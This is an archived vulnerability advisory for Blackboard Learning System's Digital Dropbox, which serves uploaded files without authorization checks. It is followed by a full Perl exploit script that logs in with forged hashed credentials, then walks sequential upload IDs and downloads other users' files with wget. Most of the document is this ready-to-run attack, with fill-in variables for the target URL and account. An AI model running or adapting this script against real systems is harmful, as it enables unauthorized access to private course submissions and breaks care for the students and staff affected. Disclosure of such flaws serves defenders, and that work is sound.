source: http://www.securityfocus.com/bid/10515/info

It is reported that Blackboard improperly allows users to download files posted in the 'Digital Dropbox'. Files in the dropbox are intended for the course administrators.

The application does not verify that the files requested for download are intended for the requester. No authorization checks are performed, and the file is served to anybody that can guess the URI.

An attacker would use this vulnerability to download potentially sensitive information.

This vulnerability is reported to exist in the Blackboard Learning System - Basic Edition (release 6), but likely exists in others as well. 

#!/usr/bin/perl

use strict;
use LWP;
use URI;
use Digest::Perl::MD5 'md5_hex';
use MIME::Base64;

#################################################################
#                                                               #
#         fill in these 3 variables to your situation           #
#                                                               #
#################################################################

my $url_to_bb = "http://blackboard.example.org/";
my $user     = 'username';
my $password = 'password';
my $encryption = 'md5'; # this may also be base64

#################################################################
# The code for the logging in onto blackboard.                  #
# I thank vandreadfull for providing me with this code          #
#################################################################

my @headers = ('User-Agent'      => 'SQL Injection Tester/1.1b (M & H)',
               'Accept-Language' => 'en-US',
               'Accept-Charset'  => 'iso-8859-1,*,utf-8',
               'Accept-Encoding' => '',
               'Accept'          => '*/*'
               );
my $browser = LWP::UserAgent->new(keep_alive => 1);
$browser->cookie_jar({});


print "logging in\n";

my $url = $url_to_bb;
print '.';
$_ = ($browser->get($url, @headers))->content;
#one more time, for some reason (probably a session or something) blackboard doesnt provide us with the one_time_token the first time
$_ = ($browser->get($url."webapps/login", @headers))->content;
my $string = $_;

# Process page to fetch hidden HTML form variables
my %postvars;
$postvars{login}    = 'Log In';
$postvars{password} = '';
while ($string =~ m{INPUT VALUE="(.*?)" NAME="(.*?)" TYPE="hidden"}g) {
    if ($2 ne 'password') {
$postvars{$2} = $1;
    }
}

# Set the username
$postvars{user_id}    = $user;
# Setting the password (md5 or base64)
if ($encryption eq 'md5') {
$_ = $string;
/<INPUT VALUE=\"([^"]*)\" NAME=\"one\_time\_token\"/;
my $one_time_token = $1;
$password = md5_hex($password);
$password =~y/a-z/A-Z/;
$password = md5_hex("$password$one_time_token");
$password =~y/a-z/A-Z/;
$postvars{encoded_pw} = $password;
}
if ($encryption eq 'base64') {
$postvars{encoded_pw} = encode_base64($password);
}

# Post login
$url = $url_to_bb."webapps/login";
print '.';
my $response = $browser->post($url, [%postvars], @headers);

# Do another refresh
$_ = $response->content;
$_ =~ m{document\.location\.replace\(\'(.*?)\'\)} || exit 1;
$url = $url_to_bb . $1;
print '.';
$browser->get($url, @headers)->content;

print "logged in\n";


#################################################################
#                                                               #
#    Fill in these 3 variables according to your needs          #
#                                 #
#################################################################

my $path="http://blackboard.example.org/courses/1/my_course/uploads//_19063_1/";
my @file=("test.txt","doc2.txt");
my $loop=10;


#################################################################
#        The code for exploiting the vulnerability              #
#################################################################

my $file;
my $wget;

$_=reverse($path);
/_(.*?)_/;
my $autocount=reverse($1);

my $orig_count=$autocount;

$wget="wget -q ";
for(my $t=0;$t<$loop;$t++) {
    $autocount--;
    $url=$path;
    $url=~ s/$orig_count/$autocount/;
    foreach $file (@file) {
system("$wget$url$file");
    }
}
print("\nDone, if the files existed they should be in this directory.\n\nkiller 2004\nhttp://www.mostly-harmless.nl/");

